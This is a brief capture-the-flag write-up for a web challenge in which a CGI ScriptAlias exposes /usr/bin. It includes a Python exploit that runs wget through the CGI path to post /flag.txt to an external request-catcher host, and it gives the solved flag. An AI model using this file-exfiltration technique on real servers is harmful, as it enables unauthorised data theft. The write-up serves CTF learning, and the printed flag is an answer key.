https://ctftime.org/event/2423

# funny (web)

cgi-bin stuff

## Solution

```conf
ScriptAlias /cgi-bin /usr/bin
```
Allows us to execute any binary on the dir with http path.
It took some trial and error to get it working, i wonder if you can solve it with awk

```python
#!/usr/bin/env python3
import requests
from urllib.parse import quote, quote_plus

REMOTE = "http://challs.tfcctf.com:31311/"

payload = f"wget?--post-file+/flag.txt+https://lalalalalallalala.requestcatcher.com/"
res = requests.get(REMOTE + f"cgi-bin/{payload}", proxies={
    'http': 'http://0.0.0.0:8080',
    'https': 'https://0.0.0.0:8080'
})
print(res.text)
```

## Flag
`TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}`

shafouz 2024/08/03
